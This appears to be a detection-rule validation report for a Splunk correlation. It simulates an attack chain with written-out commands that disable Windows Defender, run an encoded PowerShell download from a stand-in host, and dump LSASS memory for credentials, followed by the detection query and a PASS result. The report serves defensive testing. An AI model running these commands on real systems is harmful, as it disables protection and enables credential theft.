# Validation Report: Correlation Rule - Credential Theft & Evasion

## General Information

* **Correlation Name:** Multi-Stage Attack: Credential Theft & Evasion
* **Reference Rule:** `12-Correlation-Credential-Theft.md`
* **Severity:** CRITICAL
* **Objective:** Validate the detection of LSASS memory extraction following the disabling of antivirus protection through PowerShell.

## The Attack Chain (Simulated Kill Chain)

The following commands were executed on the target workstation (within 24 hours).

**Phase 1: Defense Evasion (Disabling Defender)**

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

**Phase 2: Execution (Execution of an Obfuscated Payload)**

```powershell
powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwBiAGEAZAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAiAA==
```

**Phase 3: Credential Access (LSASS Memory Dump)**

```powershell
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\Temp\lsass.dmp full
```

<img width="840" height="648" alt="Screenshot 2026-06-14 171419" src="https://github.com/user-attachments/assets/061c1a90-5cc5-48fa-892d-681c624fc9c3" />

---

## Expected Telemetry

1. `EventCode 4688` / `EventCode 1` with the string `Set-MpPreference`
2. `EventCode 4688` / `EventCode 1` with the `-enc` flag
3. `EventCode 10` (Sysmon Process Access) targeting `lsass.exe`

## Correlated Splunk Query (SPL)

```SPL id="z6r1p4"
(index=wineventlog OR index=sysmon) 
( 
  (EventCode=1 OR EventCode=4688) ("* -enc *" OR "* -encodedcommand *") 
) OR ( 
  ("*DisableRealtimeMonitoring*" OR "*Set-MpPreference*") 
) OR ( 
  EventCode=10 TargetImage="*\\lsass.exe" 
)
| transaction host maxspan=24h
| search "lsass.exe" AND ("-enc" OR "-encodedcommand") AND ("DisableRealtimeMonitoring" OR "Set-MpPreference")
| eval Attack_Chain="CRITICAL ALERT: Encoded PowerShell Execution -> Defender Disabled -> LSASS Access and Dumping"
| table _time, host, duration, Attack_Chain
```

## Validation Result and Screenshot

The correlation successfully grouped the attack timeline and isolated the compromised host.

**Result:** `PASS`

<img width="1200" height="487" alt="Screenshot 2026-06-14 171520" src="https://github.com/user-attachments/assets/8b567b8f-6e89-4ff6-a667-9cd6432af59e" />
